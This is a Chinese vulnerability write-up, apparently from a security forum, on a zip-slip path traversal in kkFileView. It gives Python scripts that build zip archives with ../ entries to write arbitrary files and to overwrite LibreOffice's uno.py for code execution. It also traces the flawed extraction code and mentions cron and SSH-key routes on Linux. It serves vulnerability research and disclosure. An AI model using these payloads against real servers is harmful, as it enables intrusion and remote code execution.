# kkFileView任意文件上传

> **来源**: https://forum.butian.net/share/2938  
> **文章ID**: 2938

---

0x01 简介

kkFileView是一个开源的在线文件预览解决方案，支持多种文件格式。

### 0x02 漏洞概述

前台上传功能支持上传zip，由于未对提取的文件名进行校验，攻击者通过上传包含恶意代码的压缩包并覆盖系统文件实现任意代码执行。

### 0x03 影响版本

4.2.0 <= kkFileView <= v4.4.0-beta

### 0x04 环境搭建

<https://github.com/kekingcn/kkFileView/releases>下载4.3.0版本源码，idea打开加载依赖

![image-20240417214408972.png](images/attach-5d537123328362cb8cfb711b1ccbc7c56cb93a3a.png)

编译成安装包

![image-20240417214543961.png](images/attach-a18f80aeeb086b01a9169676872d409fe9257c99.png)  
可能会遇到编译报错，选择使用如下命令忽略测试则可以跳过此错误，

mvn install -Dmaven.test.skip=true

成功生成压缩包

![image-20240417205446735.png](images/attach-0c46271347557714a326ce2e6dd4da68cc7f6bf9.png)

解压zip包，进入bin目录，运行startup.bat，搭建成功

![image-20240417205736549.png](images/attach-cf0991381c0d679165993b5c5234aee1851f3fec.png)

### 0x05 漏洞复现

构造zip，在zip里面必须的有其他另外一个文件：

import zipfile  
​  
if \_\_name\_\_ == "\_\_main\_\_":  
 try:  
 binary1 = b'content\_for\_file\_1'  
 binary2 = b'content\_for\_file\_2'  
   
 with zipfile.ZipFile("example.zip", "a", zipfile.ZIP\_DEFLATED) as zipFile:  
 zipFile.writestr("file1.txt", binary1)  
 zipFile.writestr("../../../../../../../file2.txt", binary2)  
   
 except IOError as e:  
 raise e  
​

上传生成的压缩包，并点击预览

![image-20240417214057481.png](images/attach-e9f3bf22bb9cd2e6a0ad2020323758518e251d57.png)

成功穿越到D盘，并且内容可控，实现任意文件上传

![image-20240417210332663.png](images/attach-ca7dd7b780a6c464268b8adc2e14c19f0d02f881.png)

那么何如在Windows上实现RCE？kkFileView在使用odt转pdf时会调用系统的Libreoffice，而此进程会调用库中的uno.py文件，因此可以覆盖该py文件的内容

import zipfile  
​  
if \_\_name\_\_ == "\_\_main\_\_":  
 try:  
 binary1 = b'hackBy0Fs47'  
 \\  
 binary2 = b"\\nimport os\\nos.system('calc')"  
​  
 with zipfile.ZipFile("testBy0Fs47.zip", "a", zipfile.ZIP\_DEFLATED) as zipFile:  
 zipFile.writestr("0Fs47Test.txt", binary1)  
 zipFile.writestr("../../LibreOfficePortable/App/libreoffice/program/uno.py", binary2)  
​  
 except IOError as e:  
 raise e

恶意代码成功写入uno.py

![image-20240417213657114.png](images/attach-90edecec8d874807869d91b5278dd22c01c6a43a.png)

上传任意的odt文件，并点击预览

![image-20240417213544022.png](images/attach-cbe7c7b3f5751cef526114daa3fce38646f592a2.png)  
成功执行命令

![image-20240417213310113.png](images/attach-ce260e64a1bb161a2068d1aa3ada512d770e2450.png)

如果在Linux上部署的，可以通过上面的方式进行rce，当然也可以通过写定时任务或者写公钥的方式达到rce。

### 0x06 代码分析

cn/keking/service/impl/CompressFilePreviewImpl#filePreviewHandle中的compressFileReader.unRar断点，传入参数：压缩包绝对路径和压缩包名

![image-20240417224929866.png](images/attach-b3ec17a60e28ff5a8df7993a4910168fa1c7f99c.png)

跟进unRar函数，来到cn/keking/service/CompressFileReader#unRar函数，在处理zip的时候，获取了zip的绝对路径

![image-20240417225246703.png](images/attach-7cd99e0cc1b6ae9bd9c5bdc7599d837211a4df17.png)

进入for循环，从zip中提取文件，创建一个输出流并将数据写入一个新的文件中，extractPath为绝对路径，而str\[0\]是我们构造的文件名，并没有进行任何过滤，实现任意文件上传。

OutputStream out \\= new FileOutputStream( extractPath+ folderName + "\_" + File.separator + str\[0\], true);

![image-20240417230443894.png](images/attach-eb420d46b581fd2983ccdcc2e16660e17ec4b6a3.png)

成功写入文件

![image-20240417230733283.png](images/attach-4e16e58ad4ea7479783111d7c6e48385efaabb7b.png)

### 0x07 修复方式

查看官网，升级补丁。

### 0x08 参考

<https://github.com/luelueking/kkFileView-v4.3.0-RCE-POC?tab=readme-ov-file>
